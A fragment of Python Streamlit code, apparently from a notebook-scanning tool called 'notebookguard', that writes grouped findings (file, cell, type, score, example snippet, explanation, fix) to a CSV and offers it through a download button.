st.subheader("💾 Export")

csv_fields = ["file", "cell", "where", "type", "score", "count",
              "example_snippet", "why", "fix"]
buf = io.StringIO()
writer = csv.DictWriter(buf, fieldnames=csv_fields)
writer.writeheader()
for g in groups:
    writer.writerow({
        "file":            g["file"],
        "cell":            g["cell"],
        "where":           g["where"],
        "type":            g["type"],
        "score":           g["score"],
        "count":           g["count"],
        "example_snippet": g["snippets"][0] if g["snippets"] else "",
        "why":             g["why"],
        "fix":             g["fix"],
    })

st.download_button(
    label="⬇ Download findings as CSV",
    data=buf.getvalue().encode("utf-8"),
    file_name="notebookguard_findings.csv",
    mime="text/csv",
    use_container_width=True,
)
